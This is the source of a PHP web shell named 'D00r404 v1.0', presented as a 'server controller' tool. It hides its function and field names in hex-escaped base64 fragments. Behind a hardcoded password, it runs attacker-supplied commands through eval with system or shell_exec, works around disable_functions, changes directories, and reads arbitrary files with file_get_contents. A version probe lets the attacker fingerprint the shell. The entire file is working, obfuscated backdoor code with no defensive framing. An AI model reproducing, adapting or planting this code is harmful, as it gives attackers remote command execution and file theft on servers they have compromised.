<?php
/*********************************************
 *         Tool Name : D00r404 v1.0          *                  
 *                                           *
 * 	   Developed by : SysteM_CrasherS [team] *
 * 	                                         *
 *   	    Youtube : @ITGeeks               *
 *                                           *
 *       Server Controller Advanced          *
 *********************************************/
$PASS_LGN = "DeFaUlT";
$XH_1 = "\x63\x77\x3d\x3d";$XH_2 = "\x65\x51\x3d\x3d";$XH_3 = "\x63\x77\x3d\x3d";$XH_4 = "\x64\x41\x3d\x3d";$XH_5 = "\x5a\x51\x3d\x3d";$XH_6 = "\x62\x51\x3d\x3d";
$XH_1 = base64_decode("$XH_1").base64_decode("$XH_2").base64_decode("$XH_3").base64_decode("$XH_4").base64_decode("$XH_5").base64_decode("$XH_6");
$CR_1 = "\x59\x77\x3d\x3d";$CR_2 = "\x63\x67\x3d\x3d";$CR_3 = "\x59\x51\x3d\x3d";$CR_4 = "\x63\x77\x3d\x3d";$CR_5 = "\x61\x41\x3d\x3d";$CR_6 = "\x5a\x51\x3d\x3d";$CR_7 = "\x63\x67\x3d\x3d";
$CR_1 = base64_decode("$CR_1").base64_decode("$CR_2").base64_decode("$CR_3").base64_decode("$CR_4").base64_decode("$CR_5").base64_decode("$CR_6").base64_decode("$CR_7");
$XS_1 = "\x63\x77\x3d\x3d";$XS_2 = "\x61\x41\x3d\x3d";$XS_3 = "\x5a\x51\x3d\x3d";$XS_4 = "\x62\x41\x3d\x3d";$XS_5 = "\x62\x41\x3d\x3d";$XS_6 = "\x58\x77\x3d\x3d";$XS_7 = "\x5a\x51\x3d\x3d";$XS_8 = "\x65\x41\x3d\x3d";$XS_9 = "\x5a\x51\x3d\x3d";$XS_10 = "\x59\x77\x3d\x3d";
$XS_1 = base64_decode("$XS_1").base64_decode("$XS_2").base64_decode("$XS_3").base64_decode("$XS_4").base64_decode("$XS_5").base64_decode("$XS_6").base64_decode("$XS_7").base64_decode("$XS_8").base64_decode("$XS_9").base64_decode("$XS_10");
$FL_1 = "\x5a\x67\x3d\x3d";$FL_2 = "\x61\x51\x3d\x3d";$FL_3 = "\x62\x41\x3d\x3d";$FL_4 = "\x5a\x51\x3d\x3d";
$FL_1 = base64_decode("$FL_1").base64_decode("$FL_2").base64_decode("$FL_3").base64_decode("$FL_4");
$PTH_1 = "\x63\x41\x3d\x3d";$PTH_2 = "\x59\x51\x3d\x3d";$PTH_3 = "\x64\x41\x3d\x3d";$PTH_4 = "\x61\x41\x3d\x3d";
$PTH_1 = base64_decode("$PTH_1").base64_decode("$PTH_2").base64_decode("$PTH_3").base64_decode("$PTH_4");
$PST = @$_POST["$CR_1"];
$PST_2 = @$_POST["$FL_1"];
$PST_3 = @$_POST["$PTH_1"];
$GET_VER1 = "\x64\x67\x3d\x3d";$GET_VER2 = "\x5a\x51\x3d\x3d";$GET_VER3 = "\x63\x67\x3d\x3d";$GET_VER4 = "\x63\x77\x3d\x3d";
$GET_VER1 = base64_decode("$GET_VER1").base64_decode("$GET_VER2").base64_decode("$GET_VER3").base64_decode("$GET_VER4");
$PST_4 = @$_POST["$GET_VER1"];
$PASS_1 = "\x63\x41\x3d\x3d";$PASS_2 = "\x59\x51\x3d\x3d";$PASS_3 = "\x63\x77\x3d\x3d";$PASS_4 = "\x63\x77\x3d\x3d";
$PASS_1 = base64_decode("$PASS_1").base64_decode("$PASS_2").base64_decode("$PASS_3").base64_decode("$PASS_4");
$PST_5 = @$_POST["$PASS_1"];;
if(isset($PST_4)){
echo "SCA";	
}
if(isset($PST_5)){
if($PST_5 == $PASS_LGN){
if(isset($PST_3)){
@chdir($PST_3);	
}
if(isset($PST)){
$DiSaBlE_FuNcTiOnS = @ini_get('disable_functions');
$f = $DiSaBlE_FuNcTiOnS ;
if(empty($f)){
echo "<pre>";
eval("@$XH_1('$PST');");
echo "</pre>";
}else{
if(!preg_match("/system/",$DiSaBlE_FuNcTiOnS)){
echo "<pre>";
eval("@$XH_1('$PST');");
echo "</pre>";	
}elseif(!preg_match("/shell_exec/",$DiSaBlE_FuNcTiOnS)){
echo "<pre>";
eval("@$XS_1('$PST');");
echo "</pre>";
}
}
}
if(isset($PST_2)){
$FLG_1 = "\x5a\x67\x3d\x3d";$FLG_2 = "\x61\x51\x3d\x3d";$FLG_3 = "\x62\x41\x3d\x3d";$FLG_4 = "\x5a\x51\x3d\x3d";$FLG_5 = "\x58\x77\x3d\x3d";$FLG_6 = "\x5a\x77\x3d\x3d";$FLG_7 = "\x5a\x51\x3d\x3d";$FLG_8 = "\x64\x41\x3d\x3d";$FLG_9 = "\x58\x77\x3d\x3d";$FLG_10 = "\x59\x77\x3d\x3d";$FLG_11 = "\x62\x77\x3d\x3d";$FLG_12 = "\x62\x67\x3d\x3d";$FLG_13 = "\x64\x41\x3d\x3d";$FLG_14 = "\x5a\x51\x3d\x3d";$FLG_15 = "\x62\x67\x3d\x3d";$FLG_16 = "\x64\x41\x3d\x3d";$FLG_17 = "\x63\x77\x3d\x3d";
$FLG_1 = base64_decode("$FLG_1").base64_decode("$FLG_2").base64_decode("$FLG_3").base64_decode("$FLG_4").base64_decode("$FLG_5").base64_decode("$FLG_6").base64_decode("$FLG_7").base64_decode("$FLG_8").base64_decode("$FLG_9").base64_decode("$FLG_10").base64_decode("$FLG_11").base64_decode("$FLG_12").base64_decode("$FLG_13").base64_decode("$FLG_14").base64_decode("$FLG_15").base64_decode("$FLG_16").base64_decode("$FLG_17");
echo "<pre>";
eval("@$FLG_1('$PST_2');");
echo "</pre>";
}
}
}else{
echo "INVAILD";	
}
?>
